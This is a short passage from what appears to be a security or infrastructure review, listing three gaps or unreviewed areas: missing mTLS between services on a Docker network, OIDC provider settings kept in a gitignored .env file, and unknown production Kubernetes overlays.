5. **mTLS configuration** — No TLS certificate management found; all inter-service communication appears plaintext over Docker network
6. **OIDC provider config** — Router exists but identity provider settings are in `.env` (gitignored)
7. **Production K8s overlays** — `k8s/envs/` contents unknown
